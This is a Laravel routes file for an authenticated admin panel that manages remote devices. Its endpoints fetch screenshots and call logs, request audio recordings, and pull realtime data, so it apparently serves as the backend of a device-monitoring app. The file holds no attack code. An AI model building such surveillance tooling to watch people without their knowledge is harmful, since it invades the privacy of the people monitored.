<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\Admin\AuthController;

/*
|--------------------------------------------------------------------------
| Admin Authentication
|--------------------------------------------------------------------------
*/
Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
Route::post('/login', [AuthController::class, 'login'])->name('login.submit');
Route::post('/logout', [AuthController::class, 'logout'])->name('logout');

/*
|--------------------------------------------------------------------------
| Admin Panel (Protected by auth middleware)
|--------------------------------------------------------------------------
*/
Route::middleware('auth')->prefix('admin')->name('admin.')->group(function () {
    Route::get('/', [AdminController::class, 'dashboard'])->name('dashboard');
    Route::get('/devices/{device}', [AdminController::class, 'deviceDetail'])->name('device.detail');

    // AJAX endpoints for admin panel
    Route::post('/devices/{device}/pull-realtime', [AdminController::class, 'pullRealtime'])->name('device.pull');
    Route::post('/devices/{device}/toggle', [AdminController::class, 'toggleDevice'])->name('device.toggle');
    Route::delete('/devices/{device}', [AdminController::class, 'deleteDevice'])->name('device.delete');
    Route::get('/devices/{device}/screenshots', [AdminController::class, 'getScreenshots'])->name('device.screenshots');
    Route::get('/devices/{device}/call-logs', [AdminController::class, 'getCallLogs'])->name('device.callLogs');
    Route::get('/screenshots/{screenshot}/serve', [AdminController::class, 'serveScreenshot'])->name('screenshot.serve');
    Route::post('/devices/{device}/request-audio', [AdminController::class, 'requestAudio'])->name('device.requestAudio');
    Route::get('/audio-recordings/{recording}/serve', [AdminController::class, 'serveAudio'])->name('audio.serve');
});

/*
|--------------------------------------------------------------------------
| Redirect root to admin
|--------------------------------------------------------------------------
*/
Route::get('/', function () {
    return redirect()->route('admin.dashboard');
});
